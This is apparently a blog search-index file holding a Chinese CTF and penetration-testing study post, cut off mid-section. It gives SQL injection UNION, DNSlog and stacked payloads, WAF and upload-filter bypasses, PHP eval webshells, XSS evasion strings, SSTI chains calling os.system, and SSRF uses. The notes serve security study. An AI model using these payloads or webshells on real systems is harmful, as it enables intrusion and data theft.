<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网安学习笔记(持续更新中)</title>
    <link href="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <url>/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><h3 id="允许测试的网页"><a href="#允许测试的网页" class="headerlink" title="允许测试的网页"></a>允许测试的网页</h3><ul><li><a href="http://testfire.net/">http://testfire.net/</a></li><li>vulnweb.com</li></ul><h3 id="工具收集信息"><a href="#工具收集信息" class="headerlink" title="工具收集信息"></a>工具收集信息</h3><ul><li>水泽(<strong>kali</strong>::  python3.7 shuize.py -d domain)</li></ul><h3 id="app-web"><a href="#app-web" class="headerlink" title="app-&gt;web"></a>app-&gt;web</h3><ul><li>反编译(漏了个大洞)</li><li>抓包(burp)</li></ul><h3 id="CDN检查-绕过"><a href="#CDN检查-绕过" class="headerlink" title="CDN检查&#x2F;绕过"></a>CDN检查&#x2F;绕过</h3><ul><li>超级ping</li><li><a href="http://ping.chinaz.com/">站长之家</a></li><li><a href="http://ping.aizhan.com/">爱站网</a></li><li><a href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></li><li><a href="https://www.17ce.com/">https://www.17ce.com/</a></li><li>子域名查询</li><li>邮件服务</li><li>国外地址 如<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li><li>遗留文件查询 如PHPinfo</li><li>fuckcdn w8fuckcdn zmap</li></ul><h3 id="waf检查"><a href="#waf检查" class="headerlink" title="waf检查"></a>waf检查</h3><ul><li>wafwoof</li><li><a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></li><li>rebots.txt</li><li>网页源码检查</li></ul><h3 id="cms建站平台识别"><a href="#cms建站平台识别" class="headerlink" title="cms建站平台识别"></a>cms建站平台识别</h3><ul><li><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li><li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li></ul><h3 id="ip发现"><a href="#ip发现" class="headerlink" title="ip发现"></a>ip发现</h3><ul><li>kali 上的 netdiscover</li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>Nmaps -sV</li><li>黑暗引擎</li></ul><h3 id="网站-服务器信息搜索"><a href="#网站-服务器信息搜索" class="headerlink" title="网站&#x2F;服务器信息搜索"></a>网站&#x2F;服务器信息搜索</h3><ul><li>bing&#x2F;google&#x2F;baidu</li><li>shodan</li><li>zoomeye</li><li>fofa</li></ul><h3 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h3><ul><li>teemo(python)</li><li>layer(exe)</li><li>证书查询(子域名公用)</li><li><a href="https://crt.sh/">crt.sh | Certificate Search</a></li></ul><h3 id="同ip、旁注、C段"><a href="#同ip、旁注、C段" class="headerlink" title="同ip、旁注、C段"></a>同ip、旁注、C段</h3><ul><li><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li></ul><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul><li>御剑</li><li>dirsearch -u url(s)</li><li>dirb(kali)</li></ul><h3 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h3><ul><li><p>ffuf(kali)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>burp-parameter-names.txt:PARAM -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.141</span>/secret?PARAM=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议<a id="PHP伪协议"></a></h3><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTF中常用的php伪协议利用 - 1ndex- - 博客园</a></p><p><a href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园</a></p><h3 id="windows镜像站"><a href="#windows镜像站" class="headerlink" title="windows镜像站"></a>windows镜像站</h3><ul><li><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></li></ul><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul><li><p><a href="https://gtfobins.github.io/">linux各命令如何提权</a></p></li><li><p><a href="https://github.com/carlospolop/PEASS-ng">自动提权检测项目</a></p></li><li><p><a href="https://www.cnblogs.com/xiaozi/p/12600258.html">提权辅助工具箱 - Bypass - 博客园</a></p></li><li><p><a href="https://blog.csdn.net/qq_37407863/article/details/125574878#:~:text=%E8%BF%90%E7%BB%B4%E4%BA%BA%E5%91%98%E5%A6%82%E6%9E%9C%E5%9C%A8%E6%9C%8D,%E6%8F%90%E5%8D%87%E5%88%B0root%E3%80%82">SSH密钥提权_ssh提权</a></p></li><li><pre><code class="hljs">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br>  <br><br>### 反弹<span class="hljs-keyword">shell</span><br><br>- [反弹<span class="hljs-keyword">shell</span>原理和常见反弹<span class="hljs-keyword">shell</span>方式 - 知乎 (zhihu.<span class="hljs-keyword">com</span>)](https://zhuanlan.zhihu.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">p</span>/<span class="hljs-number">446210083</span>)<br><br>- <span class="hljs-keyword">python</span>拿<span class="hljs-keyword">shell</span><br><br>  ```<span class="hljs-keyword">python</span><br>  <span class="hljs-keyword">python</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="做题遇到的小知识点"><a href="#做题遇到的小知识点" class="headerlink" title="做题遇到的小知识点"></a>做题遇到的小知识点</h3><ul><li><p>jsfuck(直接丢控制台跑)<img src="/.io//11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20230515091345012.png" class title="image-20230515091345012"></p></li><li><p>环境变量看一看 陌生链接点一点</p><h5 id="http头"><a href="#http头" class="headerlink" title="http头"></a>http头</h5><ul><li>代理 via</li><li>伪造ip xff client-ip  X-REAL-IP</li></ul></li><li><p><a href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTF必备密码编码大全</a></p></li><li><p>php文件上传漏洞遇到后缀限制 不仅可以通过.htaccess 也可以通过上传.user.ini文件声明一个文件包含[<a href="https://blog.csdn.net/RABCDXB/article/details/113623796">SUCTF 2019]CheckIn_</a></p></li><li><p>md5解密: md5 somd5</p></li><li><p>遇到linux靶机直接搭载本地的情况，开机后按shift，选用户界面按e，修改ro为rw single init&#x3D;&#x2F;bin&#x2F;bash 按ctrl+x进入root用户命令行</p></li><li><p>brainfuck(一键解码能解)</p></li><li><p>linux系统开放139 445端口并伴有smb服务，可利用enum4linux扫描信息</p></li><li><p><a href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">FilterChain攻击解析及利用</a></p></li><li><p><a href="https://www.anquanke.com/post/id/241148#h3-7">Proc 目录在 CTF 中的利用</a></p></li><li><p>图片隐写工具(kali)Steghide  隐写密码爆破stegseek</p></li><li><p>反弹shell后远程下载(scp), 或者</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">靶机<br>python3 -m http.server [port]<br><br>kali<br>wget <span class="hljs-link">http://</span>[<span class="hljs-string">靶机ip</span>]:[port]/文件名<br></code></pre></td></tr></table></figure></li><li><p>当返回值与页面内容不符时，可能是静态网页</p></li><li><p>拿到shell后先看history</p></li><li><p>扫目录时，如果目录不可直接查看，可以在字典后加一个.php或其他后缀再扫文件，比如</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.141/secret</span> -X <span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure></li><li><p>目录扫不出再去看js等有无泄露信息，不行就下载源码自己找敏感文件(数据库配置之类的)</p></li><li><p>全网历史版本查看 <a href="http://archive.org/web/web.php">Wayback Machine</a></p></li><li><p>拿到ssh私钥但是登陆不上，可以用工具从私钥中爆破出密码</p></li><li><p>参数中包含<code>_</code>时可用非法字符<code>[</code>进行替换</p></li><li><p>php参数传递数组<code>?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!!</code></p></li></ul><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="⭐mysql-（php注入）"><a href="#⭐mysql-（php注入）" class="headerlink" title="⭐mysql （php注入）"></a>⭐mysql （php注入）</h4><ul><li><p>判断注入点</p></li><li><p>order by 猜测列名数量</p></li><li><h5 id="报错猜解准备"><a href="#报错猜解准备" class="headerlink" title="报错猜解准备"></a>报错猜解准备</h5><ul><li>数据库版本：version()</li><li>数据库名字：database()</li><li>数据库用户：user()</li><li>操作系统：@@version_compile_os</li></ul></li><li><p>低版本 暴力破解</p></li><li><p>高版本 information_schema数据库里存放有所有数据库名、表名、列名。</p></li><li><p>表名  ?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D; <code>数据库名</code></p></li><li><p>列名   ?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;<code>表名</code></p></li><li><p>数据   ?id&#x3D;-1 union select 1,name,password,4 from <code>表名</code></p></li><li></li><li><p>注入-&gt;文件写入 文件读取(数据库语法)</p></li><li><p>魔术引号-&gt;16进制编码 宽字节</p></li></ul><h3 id="参数提交注入"><a href="#参数提交注入" class="headerlink" title="参数提交注入"></a>参数提交注入</h3><h4 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h4><ul><li>数字 字符 搜索 json</li></ul><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><ul><li>get post cookie request http头</li></ul><h3 id="各种数据库注入及注入工具使用"><a href="#各种数据库注入及注入工具使用" class="headerlink" title="各种数据库注入及注入工具使用"></a>各种数据库注入及注入工具使用</h3><h4 id="access注入-asp注入"><a href="#access注入-asp注入" class="headerlink" title="access注入(asp注入)"></a>access注入(asp注入)</h4><ul><li><p>不区分数据库 也无高级功能</p></li><li><p>库文件直接存放于网站目录下(可爆库)</p></li><li><p>联合查询 逐字猜解 使用工具(推荐)</p></li><li><p>union注入  http header注入  偏移注入等</p></li><li><h5 id="补充-表名列名猜解不到"><a href="#补充-表名列名猜解不到" class="headerlink" title="补充(表名列名猜解不到)"></a>补充(表名列名猜解不到)</h5><ul><li>列名 偏移注入</li><li>表名 源码命名方式猜解</li></ul></li></ul><h4 id="msSQL-sever注入"><a href="#msSQL-sever注入" class="headerlink" title="msSQL sever注入"></a>msSQL sever注入</h4><ul><li>获取数据 文件读写 执行sql语句</li><li>cmd命令 远程交互 注册表操作</li><li><a href="https://www.cnblogs.com/xishaonian/p/6173644.html">MSSQL注入 - 珍惜少年时 - 博客园 (cnblogs.com)</a></li></ul><h4 id="PostGresql注入"><a href="#PostGresql注入" class="headerlink" title="PostGresql注入"></a>PostGresql注入</h4><ul><li><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">PostGresql 注入知识汇总 - 一粒砂子 - 博客园 (cnblogs.com)</a></li></ul><h4 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h4><ul><li><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结 - Carrypan - 博客园 (cnblogs.com)</a></li></ul><h4 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h4><ul><li><a href="https://www.cnblogs.com/wefeng/p/11503102.html">Python操作MongoDB文档数据库 - wefeng - 博客园 (cnblogs.com)</a></li><li>sqlmap无法识别 需要用nosqlattack</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>sqlmap -u url –v 3 [–data&#x3D;”id&#x3D;1”]  <a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap</a></li><li>nosqlattack  <a href="https://github.com/youngyangyang04/NoSQLAttack">github-nosqlattack</a></li></ul><h3 id="查询方式-盲注"><a href="#查询方式-盲注" class="headerlink" title="查询方式 盲注"></a>查询方式 盲注</h3><h4 id="SQL查询语句"><a href="#SQL查询语句" class="headerlink" title="SQL查询语句"></a>SQL查询语句</h4><ul><li><p>select * from news where id&#x3D;$id</p></li><li><p>insert into news (id, url,text) values ( 2，’x’,’$t’)</p></li><li><p>delete from news where id&#x3D;$id</p></li><li><p>update user set pwd&#x3D;’$p’ where id&#x3D;2 and username&#x3D;’ admin’</p></li><li><p>select * from news order by $id</p></li><li><p>select id , name , price from news order by $order</p></li></ul><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><a href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a></p><p>1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid<br>2、基于时间的sQL盲注-延时判断 if ,sleep<br>3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue </p><ul><li><p>首先了解下updatexml()函数1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">`UPDATEXML (XML_document, XPath_string, new_value);`<br><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br><br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br><br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br><br>作用：改变文档中符合条件的节点的值<br><br>改变XML_document中符合XPATH_string的值<br><br>而我们的注入语句为：<br><br>`updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)`<br><br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 `@<span class="hljs-variable">@version</span>`<br></code></pre></td></tr></table></figure></li></ul><h3 id="特殊注入"><a href="#特殊注入" class="headerlink" title="特殊注入"></a>特殊注入</h3><h4 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h4><ul><li>参数base64编码后传入 (可能伴有url编码 如’’%3D’→’&#x3D;’)</li><li>将注入语句编码后传入参数</li></ul><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>注入的语句中 特殊符号被魔术引号转义后储存在数据库  当其他地方通过查询得到该数据并用于数据库操作时 触发注入</p><ul><li>白盒审计</li><li>常见于注册</li><li>较难发现 不实用</li></ul><h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><ul><li>ceye.io</li><li>id&#x3D;1’ and if((select load_file(concat(‘\\‘, (select version()), ‘.[自己的标号].ceye.co\abc’))),1,0)–+</li><li><a href="https://github.com/ADOOO/DnslogSqlinj">ADOOO&#x2F;DnslogSqlinj (github.com)</a></li></ul><h4 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h4><ul><li>写一个中转网页实现参数接收 加密 拼接并发送请求 且监听返回值 用注入工具对此网页进行测试</li></ul><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><ul><li>id&#x3D;1 ‘;insert into users(id,username,password) values ( 39, ‘less38 ‘, ‘hello ‘)–+</li></ul><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><h4 id="干扰匹配规则"><a href="#干扰匹配规则" class="headerlink" title="干扰匹配规则"></a>干扰匹配规则<a id="disturb"></a></h4><ul><li><pre><code class="mysql">%20union%20all%23%0a%20select%201,2,3%23 union all #  select 1,2,3#<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  <br><br><span class="hljs-comment">#### http参数污染</span><br><br>- 不同的后端代码针对多个参数有不同的取用规则<br><br>- ```mysql<br>  ?<span class="hljs-built_in">id</span>=1/**&amp;<span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,2,3<span class="hljs-comment">#*/</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul><li><pre><code class="mysql">/** ! */  配合参数污染使用↑<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>#### fuzz(脚本跑字典)<br><br>- [fuzz](D:\骚工具\fuzzdb-master)<br>- https:<span class="hljs-comment">//github.com/gh0stkey/Web-Fuzzing-Box/tree/main</span><br><br>#### ip白名单(修改http头)<br><br>- x-forwarded-for<br>- x-remote-IP<br>- x-originating-IP<br>- x-remote-addr<br>- X-<span class="hljs-built_in">Real</span>-ip<br><br>#### 静态资源<br><br>- index.php/x.txt?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br>#### url白名单<br><br>#### 爬虫白名单<br><br>- 伪装搜索引擎的收录爬虫<br><br>- 用于防止扫描工具误报及访问频率过高被拦截<br><br>- ```<br>  Mozilla/<span class="hljs-number">5.0</span> (compatible; Baiduspider/<span class="hljs-number">2.0</span>; +http:<span class="hljs-comment">//www.baidu.com/search/spider.html)</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="mysql版本号绕过"><a href="#mysql版本号绕过" class="headerlink" title="mysql版本号绕过"></a>mysql版本号绕过</h4><ul><li>&#x2F;*!50001 select 1,2,3 *&#x2F;  (版本号大于5.0.1执行)</li></ul><h4 id="sqlmap绕过waf"><a href="#sqlmap绕过waf" class="headerlink" title="sqlmap绕过waf"></a>sqlmap绕过waf</h4><ul><li><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">sqlmap的使用 —- 自带绕过脚本tamper</a></p></li><li><p>自行编写脚本  <a href="#disturb">干扰匹配规则</a></p></li><li><p>结合爬虫白名单 <code>--user-agent=&quot;&quot;</code></p></li></ul><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;<br>&lt;script language=&#x27;php&#x27;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><ul><li><p>下载源码到本地并删除js判断脚本</p></li><li><p>抓包改文件名</p></li></ul><h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><ul><li>后缀用其他格式替换 如php5 php3</li><li>apache服务器 .htaccess 文件更改执行规则</li><li>大小写 尾部空格符 点绕过 ::$DATA绕过 pphphp</li><li>第三步多次使用 绕 一次过滤</li></ul><h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><ul><li>MIME信息验证 _FILES[‘upload_file’] [‘type’] &#x3D;&#x3D; ‘image&#x2F;png’</li><li>0x00 %00 截断文件名(建立在地址)</li><li>如果php文件上传处白名单 且存在文件读取函数 如 <code>file_get_comments</code> 且 本地开放的有其他服务(比如redis)，可以利用Phar反序列化 原生类<code>SoupClient</code> 发一个post数据包 且利用CRLF实现任意数据包构造  从而打ssrf</li></ul><h5 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h5><ul><li>图片插入脚本 配合文件包含漏洞</li><li>二次渲染 条件竞争 重复上传同时访问 尝试中断删除操作</li><li>伪造文件夹-&gt;文件上传  &#x2F;upload&#x2F;webshell.php&#x2F;.</li></ul><h5 id="中间件漏洞-搭建平台"><a href="#中间件漏洞-搭建平台" class="headerlink" title="中间件漏洞(搭建平台)"></a>中间件漏洞(搭建平台)</h5><p>​<a href="https://www.freebuf.com/articles/web/192063.html">Web中间件常见漏洞总结</a></p><ul><li>tomcat  CVE2017-12615</li><li>apache  低版本解析漏洞</li><li>nginx解析漏洞 (无需脚本格式 正常上传 &#x2F;kobe.png&#x2F;0.php)</li></ul><h5 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h5><p>​fuckeditor ckeditor ueditor kindeditor…</p><h4 id="waf绕过-1"><a href="#waf绕过-1" class="headerlink" title="waf绕过"></a>waf绕过<a id="upload_waf"></a></h4><h5 id="参数名"><a href="#参数名" class="headerlink" title="参数名"></a>参数名</h5><ul><li>Content-Disposition:一般可更改</li><li>name:表单参数值，不能更改</li><li>filename :文件名，可以更改</li><li>Content-Type:文件MIME，视情况更改</li></ul><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><ul><li>数据溢出</li><li>符号变异 <code>&#39; &quot; ;</code></li><li>数据截断 <code>%00</code> <code>;</code> <code>换行</code></li><li>重复数据</li><li><a href="D:\骚工具\fuzzdb-master">fuzz</a></li></ul><h3 id="XSS跨站漏洞"><a href="#XSS跨站漏洞" class="headerlink" title="XSS跨站漏洞"></a>XSS跨站漏洞</h3><ul><li>分类 反射型、存储型、DOM型</li><li>常见手法 <a href="https://xss.yt/">平台</a>、工具、代码分析</li><li>⚠也可能为ssti 注意识别</li></ul><h5 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h5><ul><li>beef kali虚拟机装配 </li><li><a href="D:\骚工具\Postman\Postman.exe">postman</a> 改头发送数据包</li><li>burp配合fuzz字典</li><li>xssstrike.py</li></ul><h5 id="httponly绕过-利用平台"><a href="#httponly绕过-利用平台" class="headerlink" title="httponly绕过(利用平台)"></a>httponly绕过(利用平台)</h5><ul><li>表单劫持</li><li>读取浏览器保存信息</li></ul><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li><li><p>闭合标签 插入a标签 使用内置函数(onclick) 大小写防匹配 双写 编码 注释干扰字符</p></li></ul><h5 id="waf绕过-2"><a href="#waf绕过-2" class="headerlink" title="waf绕过"></a>waf绕过<a id="xss_bypass"></a></h5><ul><li>确定是不是ssti</li><li>去除右括号 并对链接加’’ <code>&lt;script src=&#39;a.com/sdfs&#39;</code></li><li>特殊符号干扰 <code>&lt;script src=&#39;a.com/sdfs&#39;#&gt; </code></li><li>标签更换 <code>&lt;a /href=&quot;a.com/sdfs&quot;#&gt;a</code> <code>&lt;img src=&#39;&#39; onerrer=&#39;a.com/sdfs&#39;&gt;</code> </li><li>三重url编码绕过符号编码</li><li>更换提交方式  unicode编码</li><li>fuzz [网站][<a href="http://www.xssfuzzer.com/fuzzer.html]">www.xssfuzzer.com/fuzzer.html]</a></li></ul><h5 id="安全修复"><a href="#安全修复" class="headerlink" title="安全修复"></a>安全修复</h5><ul><li>httponly</li><li>输入过滤</li><li>输出过滤</li></ul><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h5 id="出现位置"><a href="#出现位置" class="headerlink" title="出现位置"></a>出现位置</h5><ul><li>有xss的地方，尝试执行表达式或计算式，能给出结果</li></ul><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>模板注入，利用web模板如jinja2,tomado,Django来处理网页交互，用户的输入可以直接添加到页面内容</li></ul><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p>php中一般可以直接执行命令</p></li><li><p>python中构造链，一般由 <code>&quot;&quot;.__class__</code> 起手，不断寻找父类或子类来实现文件读写，最后的链一般如下所示</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul><li>请求伪造</li><li>抓数据包测试</li><li>伪造服务器点击 执行js脚本</li><li>burp生成poc</li></ul><h5 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h5><ul><li>随机token</li><li>同源策略referer</li></ul><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><ul><li>通过网站服务器做跳板请求内网地址</li></ul><h5 id="出现点"><a href="#出现点" class="headerlink" title="出现点"></a>出现点</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开的api实现及调用URL的功能</li><li>从URL关键字中寻找</li></ul><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul><li>可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</li><li>攻击运行在内网或本地的有漏洞程序（比如溢出）；</li><li>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</li><li>攻击内网或外网有漏洞的Web应用；</li><li>使用file：&#x2F;&#x2F;&#x2F;协议读取本地文件(或其他协议）</li></ul><h3 id="RCE代码及系统命令执行漏洞"><a href="#RCE代码及系统命令执行漏洞" class="headerlink" 